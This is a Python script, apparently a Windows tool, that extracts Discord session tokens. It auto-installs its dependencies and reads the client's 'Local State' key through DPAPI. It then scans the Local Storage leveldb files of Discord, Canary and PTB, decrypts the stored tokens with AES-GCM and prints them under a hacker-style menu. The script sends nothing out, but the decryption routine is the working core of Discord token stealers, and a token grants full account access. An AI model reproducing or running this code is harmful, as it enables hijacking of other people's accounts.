import sys
import subprocess

def almktab():
    almktab = {'pywin32': 'pywin32', 'Crypto': 'pycryptodome', 'colorama': 'colorama'}
    for mod, pkg in almktab.items():
        try:
            __import__(mod)
        except ImportError:
            print(f"[+] Installing missing package: {pkg}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

almktab()

import os
if os.name == 'nt':
    os.system('')

import json
import base64
import re
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from colorama import init, Fore, Style

init(autoreset=True)

R = Fore.RED + Style.BRIGHT
W = Fore.WHITE + Style.BRIGHT

def title(title):
    sys.stdout.write(f"\x1b]2;{title}\x07")
    sys.stdout.flush()

def menu():
    menu = f"""{R}

  ▄▄▄     ▄▄▄           ▄▄▄▄▄▄▄                        
   ███▄ ▄███           █▀▀██▀▀▀▀                       
   ██ ▀█▀ ██              ██         ▄▄           ▄    
   ██     ██   ██ ██      ██   ▄███▄ ██ ▄█▀ ▄█▀█▄ ████▄
   ██     ██   ██▄██      ██   ██ ██ ████   ██▄█▀ ██ ██
 ▀██▀     ▀██▄▄▄▀██▀      ▀██▄▄▀███▀▄██ ▀█▄▄▀█▄▄▄▄██ ▀█ {W}guns.lol/mr.glitch{R}
                 ██                                    
               ▀▀▀                                     
{Fore.YELLOW} Warning Do not give your token to anyone :)

{R} [{W}1{R}] {W}Start Token Extraction
{R} [{W}2{R}] {W}Exit
"""
    print(menu)

def getkey(path):
    try:
        localpath = os.path.join(path, "Local State")
        if not os.path.exists(localpath):
            return None
        with open(localpath, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        enc = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        enc = enc[5:]
        key = CryptUnprotectData(enc, None, None, None, 0)[1]
        return key
    except Exception:
        return None

def dec(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decp = cipher.decrypt(payload)[:-16].decode()
        return decp
    except Exception:
        return None

def distokens():
    roaming = os.getenv('APPDATA')
    localappdata = os.getenv('LOCALAPPDATA')

    paths = {
        'Discord': os.path.join(roaming, 'discord'),
        'Discord Canary': os.path.join(localappdata, 'discordcanary'),
        'Discord PTB': os.path.join(localappdata, 'discordptb')
    }

    foundtokens = {}

    for name, path in paths.items():
        localpath = path
        leveldbpath = os.path.join(path, 'Local Storage', 'leveldb')

        if not os.path.exists(leveldbpath):
            continue

        key = getkey(localpath)
        if not key:
            continue

        tokens = set()
        for filename in os.listdir(leveldbpath):
            if not filename.endswith('.log') and not filename.endswith('.ldb'):
                continue

            filepath = os.path.join(leveldbpath, filename)
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as file:
                    content = file.read()
                    for enctoken in re.findall(r"dQw4w9WgXcQ:[^.*\W][^\"]*", content):
                        try:
                            tokenb64 = enctoken.split('dQw4w9WgXcQ:')[1]
                            rawdata = base64.b64decode(tokenb64)
                            decrypted = dec(rawdata, key)
                            if decrypted:
                                tokens.add(decrypted)
                        except Exception:
                            continue
            except Exception:
                pass

        if tokens:
            foundtokens[name] = list(tokens)

    return foundtokens

if __name__ == "__main__":
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        if os.name == 'nt':
            os.system('')
        menu()
        title("My Token :)")
        choice = input(f"{R}Enter your choice {W}>").strip()

        if choice == '1':
            print(f"\n{R}[{W}*{R}] {W}Scanning local Discord paths...")
            tokensdata = distokens()

            if not tokensdata:
                print(f"{R}[{W}-{R}]{W} No active tokens found or Discord is not installed.")
            else:
                for platform, tokens in tokensdata.items():
                    print(f"\n{R}[{W}+{R}] {W}Found in {platform}:")
                    for token in tokens:
                        print(f"    {R}- Token : {W}{token}")

            input(f"\n{W}Press Enter to return to the main menu...")
        elif choice == '2':
            print(f"{R}[{W}*{R}] {W}Exiting...")
            break
        else:
            input(f"{R}[{W}-{R}] {W}Invalid choice! Press Enter to try again...")